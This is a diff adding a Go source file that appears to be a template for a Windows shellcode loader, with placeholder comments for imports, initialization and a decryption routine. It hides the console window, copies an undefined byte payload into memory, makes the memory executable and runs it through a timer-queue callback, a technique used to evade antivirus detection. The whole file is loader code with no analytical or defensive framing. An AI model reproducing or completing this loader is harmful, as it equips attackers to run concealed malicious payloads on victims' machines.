@@ -1,0 +1,46 @@
+package main
+
+import (
+	"github.com/gonutz/ide/w32"
+	"unsafe"
+	"golang.org/x/sys/windows"
+	//__import__
+)
+
+func closeWindows(commandShow uintptr) {
+	console := w32.GetConsoleWindow()
+	if console != 0 {
+		_, consoleProcID := w32.GetWindowThreadProcessId(console)
+		if w32.GetCurrentProcessId() == consoleProcID {
+			w32.ShowWindowAsync(console, commandShow)
+		}
+	}
+}
+// 解密函数
+func f() {}
+
+func main() {
+	// shellcode
+	closeWindows(w32.SW_HIDE)
+	//__init__
+
+	kernel32              := windows.NewLazyDLL("kernel32.dll")
+	ntdll                 := windows.NewLazyDLL("ntdll.dll")
+	VirtualAlloc          := kernel32.NewProc("VirtualAlloc")
+	VirtualProtect          := kernel32.NewProc("VirtualProtect")
+	CreateTimerQueue      := kernel32.NewProc("CreateTimerQueue")
+	CreateEventW          := kernel32.NewProc("CreateEventW")
+	WaitForSingleObject   := kernel32.NewProc("WaitForSingleObject")
+	CreateTimerQueueTimer := kernel32.NewProc("CreateTimerQueueTimer")
+	RtlMoveMemory         := ntdll.NewProc("RtlMoveMemory")
+
+	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(byteSlice)), 0x1000|0x2000, 0x04)
+	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&byteSlice[0])), uintptr(len(byteSlice)))
+	oldProtect := 0x04
+	_, _, _ = VirtualProtect.Call(addr, uintptr(len(byteSlice)), 0x20, uintptr(unsafe.Pointer(&oldProtect)))
+	queue, _, _ := CreateTimerQueue.Call()
+	gDoneEvent, _, _ := CreateEventW.Call(0, 1, 0, 0)
+	timer := 0
+	CreateTimerQueueTimer.Call((uintptr)(unsafe.Pointer(&timer)), queue, addr, 0, 100, 0, 0)
+	WaitForSingleObject.Call(gDoneEvent, 0xFFFFFFFF)
+}
